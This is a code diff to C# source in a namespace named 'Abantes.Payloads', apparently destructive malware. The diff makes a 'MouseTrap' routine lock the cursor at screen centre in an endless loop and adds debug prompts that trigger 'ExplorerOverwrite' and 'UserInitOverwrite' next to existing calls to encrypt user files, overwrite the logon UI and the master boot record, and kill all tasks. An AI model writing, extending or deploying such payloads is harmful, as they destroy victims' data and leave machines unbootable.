@@ -48,10 +48,13 @@ namespace Abantes.Payloads
         static Random _random = new Random();
         public static void MouseTrap()
         {
-            Position.X = 500;
-            Position.Y = 500;
+            int x = SystemInformation.VirtualScreen.Width / 2;
+            int y = SystemInformation.VirtualScreen.Height / 2;
+            Position.X = x;
+            Position.Y = y;
             while (true)
             {
+                Thread.Sleep(0200);
                 Cursor.Position = Position;
             }
         }
@@ -206,6 +209,10 @@ namespace Abantes.Payloads
                 { EncryptUserFiles(); }
                 if (MessageBox.Show("LOGON UI OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                 { LogonUIOverwrite(); }
+                if (MessageBox.Show("EXPLORER OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { ExplorerOverwrite(); }
+                if (MessageBox.Show("USERINIT OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                { UserInitOverwrite(); }
                 if (MessageBox.Show("MBR OVERWRITE?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                 { MBR_Overwrite(); }
                 if (MessageBox.Show("KILL ALL TASKS?", "DEBUG", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
